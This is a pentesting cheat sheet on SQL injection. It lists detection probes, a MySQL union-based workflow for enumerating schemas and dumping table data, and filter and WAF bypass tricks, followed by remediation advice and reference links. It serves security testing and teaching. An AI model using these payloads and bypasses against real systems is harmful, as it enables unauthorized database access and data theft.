# SQL Injection

> Server-side SQL composition with attacker-controlled input. Authorized testing only.

## TL;DR
- Detection: `'`, `' OR 1=1-- -`, `1) AND 1=2-- -`, `' UNION SELECT NULL,NULL-- -`.
- Enumeration order: column count → DB name → table list → column list → data.
- Comment styles: `-- -` (MySQL/PG/MSSQL), `#` (MySQL only), `/* */`.
- Beyond union: error-based, boolean-blind, time-based, OOB (DNS).
- CWE-89; map: OWASP WSTG-INPV-05; Top 10: A03:2021 — Injection.

## Detection / Discovery

### Probes (manual)
| Probe | Description |
| --- | --- |
| `'` | Single quote; breaks unquoted/quoted contexts |
| `'-- -` | Comment-tail neutralizer |
| `1' OR '1'='1` | Boolean truth |
| `1 AND SLEEP(5)-- -` | Time-based confirmation |

## Exploitation (MySQL union-based workflow)

The original notes describe the canonical union-based enumeration steps; each step assumes the prior step succeeded:

| Step | Payload | Goal |
| --- | --- | --- |
| 1. Detect SQLi | `'-- -`, `1'`, `''` | Confirm injectable parameter and quoting |
| 2. Count columns | `' ORDER BY 2-- -` (increment until error) | Determine column count for UNION |
| 3. DB name / version | `' UNION SELECT version(),database()-- -` | Banner + current DB |
| 4. Table list | `' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -` | One table at a time; or `group_concat(table_name)` to dump all |
| 5. Column list | `' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1-- -` | Schema enumeration |
| 6. Dump data | `' UNION SELECT COLUMN_NAME_1,COLUMN_NAME_2 FROM DATABASE.TABLE_NAME-- -` | Exfiltrate target columns |

> When `union` is filtered, fall back to boolean-blind or time-based extraction (one bit per request).

## Bypasses
- Whitespace stripping → use comments or `%09` / `%0a`.
- Case filters → `sElEcT`.
- Keyword filters → split with comments: `SEL/**/ECT`; alternate functions (`sleep` ↔ `benchmark`).
- Quote stripping → use `0x68656c6c6f` (hex) or `CONCAT(CHAR(104),…)` to build strings without quotes.
- WAF signature → encode payload with double URL encoding, mixed Unicode.

## Defence / Remediation
- **Parameterized queries / prepared statements** in every DB driver. ORM only if it uses parameterized SQL under the hood.
- **Least privilege** for the application DB user (no `GRANT ALL`, no `FILE`, no DDL, no cross-schema access). CWE-250.
- Generic error responses; never echo SQL exceptions to the client.
- DB-side: disable `LOAD DATA INFILE`, `xp_cmdshell`, `OPENROWSET`; enforce TLS to the DB; rotate creds.
- Defence in depth: WAF with positive-model rules, query allow-list, runtime instrumentation (RASP) — but parameterization is the only real fix.

## Sources
- OWASP WSTG-INPV-05 SQL Injection: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- OWASP Cheat Sheet — SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- HackTricks SQL Injection: https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
